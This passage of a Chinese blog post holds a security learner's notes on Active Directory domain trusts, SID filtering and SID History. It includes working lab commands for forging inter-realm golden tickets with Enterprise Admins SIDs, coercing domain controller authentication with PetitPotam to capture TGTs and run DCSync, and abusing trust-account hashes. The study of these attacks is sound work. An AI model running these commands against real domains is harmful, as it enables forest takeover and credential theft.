+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="assets/image-20220414122721-6j47j4z.png"
+        data-srcset="assets/image-20220414122721-6j47j4z.png, assets/image-20220414122721-6j47j4z.png 1.5x, assets/image-20220414122721-6j47j4z.png 2x"
+        data-sizes="auto"
+        alt="assets/image-20220414122721-6j47j4z.png"
+        title="image.png" /></p>
+<p>返回的就是第四张跨域的服务票据</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="assets/image-20220414122809-uvtqu12.png"
+        data-srcset="assets/image-20220414122809-uvtqu12.png, assets/image-20220414122809-uvtqu12.png 1.5x, assets/image-20220414122809-uvtqu12.png 2x"
+        data-sizes="auto"
+        alt="assets/image-20220414122809-uvtqu12.png"
+        title="image.png" /></p>
+<p>那么这里就有一个问题。父子之间的跨域的TGT怎么验证的，还是用spn指定的服务的hash加密的吗？</p>
+<h3 id="信任密钥">信任密钥</h3>
+<p>我们使用secretsdump.py把导出三个域控的hash，对比发现下面几个hash</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="n">ADC</span><span class="p">.</span><span class="n">COM</span>
+</span></span><span class="line"><span class="cl"><span class="n">A</span><span class="err">$</span><span class="p">:</span><span class="m">1164</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">b54f5c768bff145ca1c094a6d9751f09</span><span class="p">:::</span>
+</span></span><span class="line"><span class="cl"><span class="n">B</span><span class="err">$</span><span class="p">:</span><span class="m">1165</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">b88a3a068365e1ecdddd7348f195444d</span><span class="p">:::</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">B</span><span class="p">.</span><span class="n">ADC</span><span class="p">.</span><span class="n">COM</span>
+</span></span><span class="line"><span class="cl"><span class="n">ADC</span><span class="err">$</span><span class="p">:</span><span class="m">1103</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">b88a3a068365e1ecdddd7348f195444d</span><span class="p">:::</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">A</span><span class="p">.</span><span class="n">ADC</span><span class="p">.</span><span class="n">COM</span>
+</span></span><span class="line"><span class="cl"><span class="n">ADC</span><span class="err">$</span><span class="p">:</span><span class="m">1103</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">b54f5c768bff145ca1c094a6d9751f09</span><span class="p">:::</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到父域和子域之间存在一个相同的hash。我们把这些hash加到我们制作的keytab中。导入wires hark。成功解密，可以看到加密的hash是b88a3a068365e1ecdddd7348f195444d</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="assets/image-20220414144109-g4pw6b5.png"
+        data-srcset="assets/image-20220414144109-g4pw6b5.png, assets/image-20220414144109-g4pw6b5.png 1.5x, assets/image-20220414144109-g4pw6b5.png 2x"
+        data-sizes="auto"
+        alt="assets/image-20220414144109-g4pw6b5.png"
+        title="image.png" /></p>
+<p>同样的，父域给我们的票据是使用b54f5c768bff145ca1c094a6d9751f09加密</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="assets/image-20220414144359-daxtp8a.png"
+        data-srcset="assets/image-20220414144359-daxtp8a.png, assets/image-20220414144359-daxtp8a.png 1.5x, assets/image-20220414144359-daxtp8a.png 2x"
+        data-sizes="auto"
+        alt="assets/image-20220414144359-daxtp8a.png"
+        title="image.png" /></p>
+<p>这两个hash就是信任密钥（trust key）。</p>
+<p>这样我们再来看微软的这张同一林下的跨域Kerberos认证的图。是不是一目了然了呢。</p>
+<p><figure><a class="lightgallery" href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/images/cc773178.ce3a1d95-4087-4ebd-b17f-c361c7d3bce7%28ws.10%29.jpeg" title="基于域信任的 Kerberos 身份验证过程" data-thumbnail="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/images/cc773178.ce3a1d95-4087-4ebd-b17f-c361c7d3bce7(ws.10).jpeg" data-sub-html="<h2>基于域信任的 Kerberos 身份验证过程</h2><p>基于域信任的 Kerberos 身份验证过程</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/images/cc773178.ce3a1d95-4087-4ebd-b17f-c361c7d3bce7%28ws.10%29.jpeg"
+            data-srcset="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/images/cc773178.ce3a1d95-4087-4ebd-b17f-c361c7d3bce7%28ws.10%29.jpeg, https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/images/cc773178.ce3a1d95-4087-4ebd-b17f-c361c7d3bce7%28ws.10%29.jpeg 1.5x, https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/images/cc773178.ce3a1d95-4087-4ebd-b17f-c361c7d3bce7%28ws.10%29.jpeg 2x"
+            data-sizes="auto"
+            alt="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/images/cc773178.ce3a1d95-4087-4ebd-b17f-c361c7d3bce7(ws.10).jpeg" />
+    </a><figcaption class="image-caption">基于域信任的 Kerberos 身份验证过程</figcaption>
+    </figure></p>
+<h2 id="sid筛选">SID筛选</h2>
+<p>林信任和同一林下的父子信任默认sid筛选不启用。但林信任确实过滤一些sid</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">查询
+</span></span><span class="line"><span class="cl">netdom trust /d:cdc.com adc.com /Quarantine:
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>创建一个外部信任域，sid筛选默认启用，信任关系不可传递</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="assets/image-20220414151541-nezv5xf.png"
+        data-srcset="assets/image-20220414151541-nezv5xf.png, assets/image-20220414151541-nezv5xf.png 1.5x, assets/image-20220414151541-nezv5xf.png 2x"
+        data-sizes="auto"
+        alt="assets/image-20220414151541-nezv5xf.png"
+        title="image.png" /></p>
+<h3 id="sidhistory">SIDHistory</h3>
+<blockquote>
+<p>根据微软的解释，SID History 是一个支持迁移方案的属性，每个用户帐户都有一个关联的安全标识符 (SID)，用于跟踪安全主体和帐户在连接到资源时的访问权限。SID 历史记录允许将另一个帐户的访问有效地克隆到另一个帐户，并且对于确保用户在从一个域移动（迁移）到另一个域时保留访问权限非常有用。<br>
+而一个账户可以在SID-History Active Directory 属性中保存额外的 SID ，从而允许域之间进行可相互操作的帐户迁移（例如，SID-History 中的所有值都包含在访问令牌中）。<br>
+为了达到SID History攻击的目的，我们的将使用域管理员权限，将获取到的有权限的SID值插入到SID历史记录中，以实现模拟任意用户/组（例如Enterprise Admins）的权限，达到跨域提权目的。</p>
+</blockquote>
+<h3 id="过滤规则">过滤规则</h3>
+<p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280?redirectedfrom=MSDN" target="_blank" rel="noopener noreffer">[MS-PAC]：SID 过滤和声明转换 | 微软文档 (microsoft.com)</a></p>
+<p>同一个林，不过滤sid。</p>
+<p>林信任：默认启用sid筛选；过滤掉所有不存在发起者所在的林中的sid。也就是说林A的某个用户对林B的资源发起访问，林B返回给该用户的服务票据的PAC中extra sids只包含林A存在的组的sid。林B中的sid会被删除。</p>
+<p>Dirk-jan在它的文章中提到的启用sidhistory时的sid筛选机制，但我的环境sidhistory一直启动不成功。</p>
+<blockquote>
+<p><a href="https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/" target="_blank" rel="noopener noreffer">Active Directory forest trusts part 1 - How does SID filtering work? - dirkjanm.io</a></p>
+<p>netdom有个enablesidhistory选项，再林B开启后，就不会过滤来自林A请求的sid。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">netdom trust /d:forest-a.local forest-b.local /enablesidhistory:yes
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后两个林之间的信任关系就是<code>TREAT_AS_EXTERNAL</code>。这时候林信任就被视为外部信任。不会过滤掉本域的sid。</p>
+<ul>
+<li>
+<p>但是会删除Domain Admins/Enterprise Admins/Account Operators 组。</p>
+</li>
+<li>
+<p>Domain Admins 组未添加到<code>ResourceGroup</code>PAC 的一部分，即使组 3101 是该组的直接成员。这是因为 Domain Admins 组是一个<strong>全局</strong>组，而PAC 中只添加了<strong>域本地组。</strong></p>
+</li>
+</ul>
+<p>如果跨森林信任启用 SID 历史记录，您可以 <strong>欺骗任何 RID &gt;1000的组！</strong> 在大多数环境中，这将允许攻击者破坏森林。例如，在许多设置中允许将<a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/" target="_blank" rel="noopener noreffer">权限升级到 DA</a>的 Exchange 安全组都具有大于 1000 的 RID。此外，许多组织将为工作站管理员或帮助台提供自定义组，这些组在工作站或服务器上被赋予本地管理员权限。例如，我刚刚为该<code>IT-Admins</code>组（具有 RID 3101，这是我们的黄金票据的一部分）授予了<code>forest-b-server</code>机器上的管理员权限。</p>
+</blockquote>
+<p><strong>一些不会被过滤的sid：</strong></p>
+<blockquote>
+<p>S-1-5-9                       Enterprise Domain Controllers</p>
+<p>S-1-4                           非唯一权威</p>
+<p>S-1-5-15                      这个组织</p>
+<p>S-1-5-21-0-0-0-496    复合认证</p>
+<p>S-1-5-21-0-0-0-497    索赔有效</p>
+<p>S-1-5-1000-                其他组织</p>
+<p>S-1-5-R-R&gt;1000         可扩展S-1-10护照管理局</p>
+</blockquote>
+<h2 id="跨域">跨域</h2>
+<p>我们拿到了子域的域管权限。想要进一步拿下父域。但子域的域管并不是父域的域管。怎么办呢？</p>
+<h3 id="跨域金票">跨域金票</h3>
+<p>在子域控上导出krbtgt的hash，制作金票。也可以用信任密钥加密。其实这俩一样，只不过换了个hash加密而已。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c#" data-lang="c#"><span class="line"><span class="cl"><span class="n">lsadump</span><span class="p">::</span><span class="n">lsa</span> <span class="p">/</span><span class="n">inject</span> <span class="p">/</span><span class="n">name</span><span class="p">:</span><span class="n">krbtgt</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">kerberos</span><span class="p">::</span><span class="n">golden</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">b</span><span class="p">.</span><span class="n">adc</span><span class="p">.</span><span class="n">com</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">TB</span> <span class="p">/</span><span class="n">id</span><span class="p">:</span><span class="m">1104</span> <span class="p">/</span><span class="n">groups</span><span class="p">:</span><span class="m">513</span> <span class="p">/</span><span class="n">sid</span><span class="p">:</span><span class="n">S</span><span class="p">-</span><span class="m">1</span><span class="p">-</span><span class="m">5</span><span class="p">-</span><span class="m">21</span><span class="p">-</span><span class="m">380941772</span><span class="p">-</span><span class="m">2247100965</span><span class="p">-</span><span class="m">3625425370</span> <span class="p">/</span><span class="n">sids</span><span class="p">:</span><span class="n">S</span><span class="p">-</span><span class="m">1</span><span class="p">-</span><span class="m">5</span><span class="p">-</span><span class="m">21</span><span class="p">-</span><span class="m">3427068280</span><span class="p">-</span><span class="m">546657318</span><span class="p">-</span><span class="m">2538748504</span><span class="p">-</span><span class="m">519</span><span class="p">,</span><span class="n">S</span><span class="p">-</span><span class="m">1</span><span class="p">-</span><span class="m">5</span><span class="p">-</span><span class="m">9</span> <span class="p">/</span><span class="n">krbtgt</span><span class="p">:</span><span class="m">8</span><span class="n">bd3cbe5d54eb2d1c9274d940c3d165a</span> <span class="p">/</span><span class="n">ptt</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">kerberos</span><span class="p">::</span><span class="n">golden</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">administrator</span> <span class="p">/</span><span class="n">id</span><span class="p">:</span><span class="m">500</span> <span class="p">/</span><span class="n">sid</span><span class="p">:</span><span class="n">S</span><span class="p">-</span><span class="m">1</span><span class="p">-</span><span class="m">5</span><span class="p">-</span><span class="m">21</span><span class="p">-</span><span class="m">3472340072</span><span class="p">-</span><span class="m">1697025292</span><span class="p">-</span><span class="m">3535703670</span> <span class="p">/</span><span class="n">sids</span><span class="p">:</span><span class="n">S</span><span class="p">-</span><span class="m">1</span><span class="p">-</span><span class="m">5</span><span class="p">-</span><span class="m">21</span><span class="p">-</span><span class="m">3427068280</span><span class="p">-</span><span class="m">546657318</span><span class="p">-</span><span class="m">2538748504</span><span class="p">-</span><span class="m">519</span><span class="p">,</span><span class="n">S</span><span class="p">-</span><span class="m">1</span><span class="p">-</span><span class="m">5</span><span class="p">-</span><span class="m">9</span><span class="p">,</span><span class="n">S</span><span class="p">-</span><span class="m">1</span><span class="p">-</span><span class="m">5</span><span class="p">-</span><span class="m">21</span><span class="p">-</span><span class="m">380941772</span><span class="p">-</span><span class="m">2247100965</span><span class="p">-</span><span class="m">3625425370</span><span class="p">-</span><span class="m">512</span><span class="p">,</span><span class="n">S</span><span class="p">-</span><span class="m">1</span><span class="p">-</span><span class="m">5</span><span class="p">-</span><span class="m">15</span> <span class="p">/</span><span class="n">krbtgt</span><span class="p">:</span><span class="m">922d9</span><span class="n">ee0c87f0aed5c72222ee1d47d0a</span> <span class="p">/</span><span class="n">ptt</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">a</span><span class="p">.</span><span class="n">adc</span><span class="p">.</span><span class="n">com</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">python3</span> <span class="n">ticketer</span><span class="p">.</span><span class="n">py</span> <span class="p">-</span><span class="n">nthash</span> <span class="m">922d9</span><span class="n">ee0c87f0aed5c72222ee1d47d0a</span> <span class="p">-</span><span class="n">user</span><span class="p">-</span><span class="n">id</span> <span class="m">1104</span> <span class="p">-</span><span class="n">groups</span> <span class="m">513</span> <span class="p">-</span><span class="n">domain</span> <span class="n">a</span><span class="p">.</span><span class="n">adc</span><span class="p">.</span><span class="n">com</span> <span class="p">-</span><span class="n">domain</span><span class="p">-</span><span class="n">sid</span> <span class="n">S</span><span class="p">-</span><span class="m">1</span><span class="p">-</span><span class="m">5</span><span class="p">-</span><span class="m">21</span><span class="p">-</span><span class="m">3472340072</span><span class="p">-</span><span class="m">1697025292</span><span class="p">-</span><span class="m">3535703670</span> <span class="p">-</span><span class="n">extra</span><span class="p">-</span><span class="n">sid</span> <span class="n">S</span><span class="p">-</span><span class="m">1</span><span class="p">-</span><span class="m">5</span><span class="p">-</span><span class="m">21</span><span class="p">-</span><span class="m">3427068280</span><span class="p">-</span><span class="m">546657318</span><span class="p">-</span><span class="m">2538748504</span><span class="p">-</span><span class="m">519</span><span class="p">,</span><span class="n">S</span><span class="p">-</span><span class="m">1</span><span class="p">-</span><span class="m">5</span><span class="p">-</span><span class="m">9</span> <span class="s">&#34;TA&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">TB</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">b</span><span class="p">.</span><span class="n">adc</span><span class="p">.</span><span class="n">com</span> <span class="p">/</span><span class="n">aes256</span><span class="p">:</span><span class="n">e725be784d9e460e6dfc89074c5a246b8de5e54b11ab0fb2f3e9918d815383a6</span> <span class="p">/</span><span class="n">opsec</span> <span class="p">/</span><span class="n">nowrap</span>
+</span></span><span class="line"><span class="cl"><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgs</span> <span class="p">/</span><span class="n">service</span><span class="p">:</span><span class="n">krbtgt</span><span class="p">/</span><span class="n">adc</span><span class="p">.</span><span class="n">com</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">b</span><span class="p">.</span><span class="n">adc</span><span class="p">.</span><span class="n">com</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="n">iis02</span><span class="p">.</span><span class="n">b</span><span class="p">.</span><span class="n">adc</span><span class="p">.</span><span class="n">com</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgs</span> <span class="p">/</span><span class="n">service</span><span class="p">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">DC01</span><span class="p">.</span><span class="n">adc</span><span class="p">.</span><span class="n">com</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">adc</span><span class="p">.</span><span class="n">com</span> <span class="p">/</span><span class="n">dc</span><span class="p">:</span><span class="n">DC01</span><span class="p">.</span><span class="n">adc</span><span class="p">.</span><span class="n">com</span> <span class="p">/</span><span class="n">nowrap</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="assets/image-20220418091318-33s3mq6.png"
+        data-srcset="assets/image-20220418091318-33s3mq6.png, assets/image-20220418091318-33s3mq6.png 1.5x, assets/image-20220418091318-33s3mq6.png 2x"
+        data-sizes="auto"
+        alt="assets/image-20220418091318-33s3mq6.png"
+        title="image.png" /></p>
+<h3 id="非约束委派">非约束委派</h3>
+<p>学非约束委派时就提到过。域控默认都是非约束委派的机器，通过RPC强制父域控返回身份认证，在子域控上哪到父域机器账户的TGT。</p>
+<p>这里需要注意的是，这种手法同样适用于林信任，但在外部信任不可用。如果开启了sid筛选，也抓不到TGT</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python3 PetitPotam.py  dc04.cdc.com 10.10.10.10 -u administrator -p sss@123
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Rubeus.exe monitor /interval:1 /nowrap
+</span></span><span class="line"><span class="cl">Rubeus.exe  ptt /ticket:....................
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">lsadump::dcsync /user:adc\krbtgt /domain:adc.com
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="assets/image-20220418093512-krrug8f.png"
+        data-srcset="assets/image-20220418093512-krrug8f.png, assets/image-20220418093512-krrug8f.png 1.5x, assets/image-20220418093512-krrug8f.png 2x"
+        data-sizes="auto"
+        alt="assets/image-20220418093512-krrug8f.png"
+        title="image.png" /></p>
+<h3 id="信任账户攻击">信任账户攻击</h3>
+<p>很好理解的攻击方式。一张图就可以解决。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="assets/image-20220418200830-xt8pdwb.png"
+        data-srcset="assets/image-20220418200830-xt8pdwb.png, assets/image-20220418200830-xt8pdwb.png 1.5x, assets/image-20220418200830-xt8pdwb.png 2x"
+        data-sizes="auto"
+        alt="assets/image-20220418200830-xt8pdwb.png"
+        title="image.png" /></p>
+<p>B单向信任A，A可以访问B的资源，B访问不了A的资源。</p>
+<p>但我们知道，两个域建立信任后再每一个域都会有一个信任账户，这两账户的RC4hash是相同的。</p>
+<p>而这个信任账户属于domain users组。那我们不就能获取另一个域的一个普通用户的凭据，即使他不信任本域。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="assets/image-20220418201259-ie8t1m3.png"
+        data-srcset="assets/image-20220418201259-ie8t1m3.png, assets/image-20220418201259-ie8t1m3.png 1.5x, assets/image-20220418201259-ie8t1m3.png 2x"
+        data-sizes="auto"
+        alt="assets/image-20220418201259-ie8t1m3.png"
+        title="image.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Rubeus.exe asktgt /user:ADC$ /rc4:57bfc5b3ca85281f3d504f0fa355c6e5 /dc:DC04.cdc.com /domain:cdc.com /ptt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>有了凭据，那我们就可以对一个不信任我们的域进行</p>
+<ul>
+<li>AD枚举/攻击路径发现</li>
+<li>网络共享枚举</li>
+<li>创建 DNS 记录</li>
+<li>将计算机加入域</li>
+<li>利用证书模板</li>
+<li>kerberoasting</li>
+<li>以及更多&hellip;</li>
+</ul>
+<h3 id="黄金gmsa">黄金GMSA</h3>
+<p>这个就没怎怎么看了，有兴趣自己学把，作者还提到其他几种方法，具体看文章</p>
+<p><a href="https://www.semperis.com/blog/golden-gmsa-attack/" target="_blank" rel="noopener noreffer">Introducing the Golden GMSA Attack | Semperis</a></p>
+<p><a href="https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research" target="_blank" rel="noopener noreffer">SID filter as security boundary between domains? (Part 4) - Bypass SID filtering research — Improsec | improving security</a></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 0001-01-01</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/%E5%9F%9F%E4%BF%A1%E4%BB%BB%E4%B8%8E%E8%B7%A8%E5%9F%9F/index.md" target="_blank">阅读原始文档</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+            <a href="/config/" class="next" rel="next" title="个人配置">个人配置<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.96.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">nmk</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.8/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@7.0.4/dist/typeit.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":30},"comment":{},"data":{"id-1":"NMK","id-2":"NMK"},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":" $","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":300}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
